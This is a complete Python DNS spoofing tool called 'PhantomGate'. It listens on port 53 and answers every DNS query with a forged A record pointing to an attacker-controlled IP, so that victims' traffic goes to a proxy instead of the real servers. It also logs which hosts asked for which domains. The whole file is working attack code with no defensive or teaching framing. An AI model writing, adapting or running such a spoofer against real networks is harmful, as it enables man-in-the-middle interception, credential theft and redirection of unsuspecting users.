#!/usr/bin/env python3
"""
PhantomGate DNS Spoofer
Intercepts all DNS queries and returns attacker IP (172.31.142.204)
Forces all victims to connect to PhantomGate proxy instead of real servers.
"""

import socket
import threading
import sys

LISTEN_PORT = 53

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def parse_ip(ip_str):
    return bytes(int(x) for x in ip_str.split("."))

ATTACKER_IP_STR = sys.argv[1] if len(sys.argv) > 1 else get_local_ip()
ATTACKER_IP = parse_ip(ATTACKER_IP_STR)

def build_response(data):
    try:
        qid    = data[:2]
        qdcount = data[4:6]
        # Response flags: QR=1, AA=1, RD=1, RA=1, RCODE=0
        flags  = b'\x81\x80'
        # Keep original question section (starts at byte 12)
        question = data[12:]

        reply  = qid
        reply += flags
        reply += qdcount        # QDCOUNT (same as query)
        reply += qdcount        # ANCOUNT (1 answer per question)
        reply += b'\x00\x00'   # NSCOUNT
        reply += b'\x00\x00'   # ARCOUNT
        reply += question       # Original question section

        # Answer record
        reply += b'\xc0\x0c'           # NAME: pointer to question name
        reply += b'\x00\x01'           # TYPE: A record
        reply += b'\x00\x01'           # CLASS: IN
        reply += b'\x00\x00\x00\x1e'  # TTL: 30 seconds
        reply += b'\x00\x04'           # RDLENGTH: 4 bytes
        reply += ATTACKER_IP           # RDATA: 172.31.142.204

        return reply
    except Exception:
        return None

def handle(data, addr, sock):
    try:
        # Try to extract queried domain for logging
        domain = ""
        try:
            i = 12
            while data[i] != 0:
                length = data[i]
                domain += data[i+1:i+1+length].decode(errors='replace') + "."
                i += length + 1
            domain = domain.rstrip(".")
        except Exception:
            domain = "<unknown>"

        reply = build_response(data)
        if reply:
            sock.sendto(reply, addr)
            print(f"[DNS SPOOF] {addr[0]} asked for '{domain}' -> {ATTACKER_IP_STR}")
    except Exception as e:
        print(f"[ERROR] {e}")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", LISTEN_PORT))
    except PermissionError:
        print("[!] Permission denied — run with sudo")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Cannot bind to port {LISTEN_PORT}: {e}")
        sys.exit(1)

    print(f"[DNS SPOOFER] Listening on 0.0.0.0:{LISTEN_PORT}")
    print(f"[DNS SPOOFER] All queries -> {ATTACKER_IP_STR} (PhantomGate)")
    print(f"[DNS SPOOFER] Press Ctrl+C to stop\n")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            t = threading.Thread(target=handle, args=(data, addr, sock), daemon=True)
            t.start()
        except KeyboardInterrupt:
            print("\n[DNS SPOOFER] Stopped.")
            break
        except Exception as e:
            print(f"[ERROR] {e}")

if __name__ == "__main__":
    main()
